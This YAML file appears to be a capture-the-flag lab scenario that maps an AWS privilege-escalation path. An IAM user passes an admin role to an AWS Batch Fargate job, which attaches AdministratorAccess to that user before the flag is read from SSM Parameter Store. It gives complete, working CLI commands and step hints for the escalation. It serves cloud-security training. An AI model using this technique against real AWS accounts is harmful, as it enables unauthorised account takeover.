attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-batch-001-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer,
        compromising a CI/CD pipeline, discovering credentials in a public S3 bucket,
        or finding them hardcoded in source code.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole on a specific admin role plus
        batch:RegisterJobDefinition and batch:SubmitJob — enough to register a Batch
        job definition that runs as the admin role and submit it to an existing queue.

    - id: batch-job
      label: "Batch Job Container"
      type: resource
      subType: batch-job
      arn: "arn:aws:batch:{region}:{account_id}:job/pl-batch-001-privesc-job"
      description: >
        An AWS Batch job submitted to the Fargate compute environment. The job
        definition specifies the admin role as the jobRoleArn, so the ECS task
        running the container receives the admin role's credentials via the ECS
        container credential provider. The container image (amazon/aws-cli) runs
        an iam:AttachUserPolicy command as the admin role, granting the starting
        user AdministratorAccess.

    - id: admin-role
      label: "Admin Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-batch-001-to-admin-admin-role"
      description: >
        This IAM role has AdministratorAccess and trusts ecs-tasks.amazonaws.com.
        It is passed as the jobRoleArn in the registered Batch job definition. When
        the Batch job runs, ECS assumes this role for the container, giving the
        container full administrative permissions. The container uses those permissions
        to attach AdministratorAccess to the starting user, completing the privilege
        escalation.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/batch-001-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-user
      to: batch-job
      label: "iam:PassRole + batch:RegisterJobDefinition + batch:SubmitJob"
      description: >
        The starting user passes the admin role as the jobRoleArn when registering a
        Batch job definition. iam:PassRole is required for this because it associates
        a privileged IAM role with a compute workload. The user then submits the job
        to an existing Fargate job queue, causing Batch/ECS to launch a container that
        inherits the admin role's credentials.
      hints:
        - "Register a job definition using batch:RegisterJobDefinition with --type container --platform-capabilities FARGATE. Set jobRoleArn to the admin role ARN and executionRoleArn to the execution role ARN. The container command should be an AWS CLI iam:AttachUserPolicy call."
        - "Submit the job to the existing queue using batch:SubmitJob. Poll batch:DescribeJobs until status is SUCCEEDED (Fargate provisioning takes 1-3 minutes)."
        - "Browse to https://pathfinding.cloud/paths/batch-001 for full technique details."
      commands:
        - description: "Check your current identity"
          command: "aws sts get-caller-identity"
        - description: "Register a Batch job definition with the admin role as jobRoleArn"
          command: >
            aws batch register-job-definition
            --job-definition-name pl-batch-001-privesc-job-def
            --type container
            --platform-capabilities FARGATE
            --container-properties '{"image":"amazon/aws-cli:latest","jobRoleArn":"arn:aws:iam::{account_id}:role/pl-prod-batch-001-to-admin-admin-role","executionRoleArn":"arn:aws:iam::{account_id}:role/pl-prod-batch-001-to-admin-execution-role","resourceRequirements":[{"type":"VCPU","value":"0.25"},{"type":"MEMORY","value":"512"}],"networkConfiguration":{"assignPublicIp":"ENABLED"},"command":["iam","attach-user-policy","--user-name","pl-prod-batch-001-to-admin-starting-user","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}'
        - description: "Submit the job to the queue"
          command: >
            aws batch submit-job
            --job-name pl-batch-001-privesc-job
            --job-queue pl-prod-batch-001-to-admin-job-queue
            --job-definition pl-batch-001-privesc-job-def:1
        - description: "Poll job status until SUCCEEDED"
          command: "aws batch describe-jobs --jobs <job-id> --query 'jobs[0].status' --output text"

    - from: batch-job
      to: admin-role
      label: "Container executes as admin role via ECS task credentials"
      description: >
        The Batch job container receives the admin role's credentials automatically
        through the ECS container credential provider (169.254.170.2). The container
        runs the AWS CLI iam:AttachUserPolicy command as the admin role, attaching
        AdministratorAccess to the starting user. After the job succeeds, wait 15
        seconds for IAM policy propagation before verifying escalation.
      hints: []
      commands:
        - description: "Verify AdministratorAccess was attached to the starting user"
          command: "aws iam list-attached-user-policies --user-name pl-prod-batch-001-to-admin-starting-user"
        - description: "Verify admin access with the starting user credentials"
          command: "aws iam list-users --max-items 3 --output table"

    - from: admin-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access just gained.
      hints:
        - "You now hold admin-equivalent credentials. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
        - "Scenario flags live under a shared prefix in SSM Parameter Store — consider what a reasonable naming convention for this lab might look like."
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/batch-001-to-admin --query 'Parameter.Value' --output text"
